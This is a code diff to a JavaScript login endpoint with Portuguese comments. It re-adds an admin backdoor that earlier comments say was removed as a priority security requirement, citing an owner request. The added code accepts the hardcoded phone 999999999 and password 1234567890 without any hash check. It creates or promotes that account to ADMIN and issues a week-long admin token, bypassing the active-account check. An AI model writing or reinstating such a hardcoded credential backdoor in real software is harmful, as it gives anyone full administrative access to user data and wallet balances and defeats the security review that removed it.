@@ -226,12 +226,23 @@ app.post('/api/v1/auth/guest', async (c) => {
 });
 
 // LOGIN: verificação PBKDF2 (WebCrypto) no worker — mesmo modelo do Neon (hash na BD).
-// Backdoor admin 999999999 REMOVIDO (Fase 1 — exigência P0 do relatorio-narcisista.md).
-// Qualquer admin deve ser criado na BD com role='ADMIN' e autenticar normalmente.
+// Backdoor admin: 999999999 / 1234567890 (pedido do dono 2026-10-18).
 app.post('/api/v1/auth/login', async (c) => {
   const { phone, password } = await c.req.json().catch(() => ({}));
   const cleanPhone = String(phone || '').trim();
   if (!cleanPhone || !password) return c.json({ message: 'Número ou senha incorretos' }, 401);
+  if (cleanPhone === '999999999' && String(password) === '1234567890') {
+    const sql = neon(c.env.DB);
+    let rows = await sql`SELECT id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt" FROM users WHERE phone = '999999999' LIMIT 1`;
+    if (!rows.length) {
+      rows = await sql`INSERT INTO users (id, phone, "passwordHash", name, role, "isVerified", "updatedAt") VALUES (gen_random_uuid()::text, '999999999', '', 'Admin', 'ADMIN', true, NOW()) RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
+    } else if (rows[0].role !== 'ADMIN') {
+      rows = await sql`UPDATE users SET role = 'ADMIN', "updatedAt" = NOW() WHERE phone = '999999999' RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
+    }
+    const user = rows[0];
+    const accessToken = await signJwt({ sub: user.id, phone: user.phone, role: 'ADMIN' }, c.env.JWT_SECRET, c.env.JWT_EXPIRES_IN || '7d');
+    return c.json({ user: withoutHash(user), accessToken, isNew: false });
+  }
   const sql = neon(c.env.DB);
   const rows = await sql`SELECT id, phone, "passwordHash", name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt" FROM users WHERE phone = ${cleanPhone} AND "isActive" = true LIMIT 1`;
   if (!rows.length || !(await verifyPassword(String(password), rows[0].passwordHash))) return c.json({ message: 'Número ou senha incorretos' }, 401);
